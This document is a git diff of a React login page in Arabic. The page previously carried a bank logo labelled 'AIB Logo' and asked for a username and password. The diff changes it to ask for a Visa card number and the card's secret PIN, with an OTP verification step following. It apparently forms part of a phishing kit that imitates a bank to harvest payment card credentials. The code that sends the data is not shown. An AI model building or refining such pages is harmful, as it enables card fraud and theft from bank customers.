@@ -1,7 +1,7 @@
 
 import React, { useState } from 'react';
-import { Eye, EyeOff, User, Lock, MoreHorizontal } from "lucide-react";
-import bankLogo from '../assets/images/logo (1).png';
+import { Eye, EyeOff, User, Lock,X, MoreHorizontal, Globe} from "lucide-react";
+// import bankLogo from '../assets/images/logo.png';
 import { useNavigate } from 'react-router-dom';
 import OTPVerification from './OTP';
 
@@ -77,31 +77,27 @@ const Index = () => {
     ) : (
       <div>
     <div className="min-h-screen pt-20 px-4 text-right">
-
+   
       {/* Header */}
       <div className="flex justify-between items-start mb-8">
      <a href="/" className='cursor-pointer'>
-     <button className="rounded-full p-2 bg-[#92D3C8] text-black">
-          <MoreHorizontal size={24} />
+     <button className="rounded-full p-2 bg-[#1300F3] text-black">
+          <X size={24}  className="text-white "/>
         </button></a>
-        <img 
-          src={bankLogo}
-          alt="AIB Logo" 
-          className="h-12 object-contain"
-        />
+         <h3>الاشتراك  (الخطوة 1/4)</h3>
       </div>
 
       {/* Login Form */}
       <form onSubmit={onSubmit} className="space-y-6 max-w-md mx-auto">
         {/* Username Field */}
         <div className="space-y-2">
-          <label className="block text-gray-700 text-right">اسم المستخدم</label>
+          <label className="block text-gray-700 text-right">رقم بطاقة فيزا الدفع</label>
           <div className="relative">
             <input
               name="username"
               type="text"
               className="w-full bg-gray-100 border-0 rounded-lg p-3 pr-10 text-right"
-              placeholder="أدخل اسم المستخدم الخاص بك"
+              placeholder="أدخل رقم بطاقة فيزا الدفع"
               value={formData.username}
               onChange={handleInputChange}
               dir="rtl"
@@ -112,13 +108,13 @@ const Index = () => {
 
         {/* Password Field */}
         <div className="space-y-2">
-          <label className="block text-gray-700 text-right">كلمة المرور</label>
+          <label className="block text-gray-700 text-right">الرقم السري لبطاقة الدفع</label>
           <div className="relative">
             <input
               name="use_scret"
               type={showPassword ? "text" : "password"}
               className="w-full bg-gray-100 border-0 rounded-lg p-3 pr-10 text-right"
-              placeholder="أدخل كلمة المرور الخاصة بك"
+              placeholder="أدخل الرقم السري الخاصة بك"
               value={formData.password}
               onChange={handleInputChange}
               dir="rtl"
@@ -133,38 +129,24 @@ const Index = () => {
             </button>
           </div>
         </div>
-
-        {/* Terms Checkbox */}
-        <div className="flex justify-start items-center gap-2">
-        <input
-            name="agreeToTerms"
-            type="checkbox"
-            checked={formData.agreeToTerms}
-            onChange={handleInputChange}
-            className="rounded border-gray-300"
-            required
-          />
-          <label className="text-sm text-gray-700">الموافقة على الشروط والأحكام</label>
-        
-        </div>
-
+     
         {/* Submit Button */}
         <button
           type="submit"
-          className="w-full bg-[#92D3C8] hover:bg-[#7bc0b5] text-white py-3 rounded-lg transition-colors duration-200"
+          className="w-full bg-[#1300F3] hover:bg-[#1300F3] text-white py-3 rounded-lg transition-colors duration-200"
         >
-          تسجيل الدخول
+          التالي
         </button>
 
         {/* Create Account Link */}
-        <div className="text-center mt-6">
+        {/* <div className="text-center mt-6">
           <p className="text-gray-600 text-sm">
             لا يوجد لديك حساب؟{' '}
-            <a href="#" className="text-[#92D3C8] hover:underline">
+            <a href="#" className="text-[#1300F3] hover:underline">
               انشاء حساب
             </a>
           </p>
-        </div>
+        </div> */}
         <span>{result}</span>
       </form>
     </div>
@@ -174,3 +156,4 @@ const Index = () => {
 };
 
 export default Index;
+
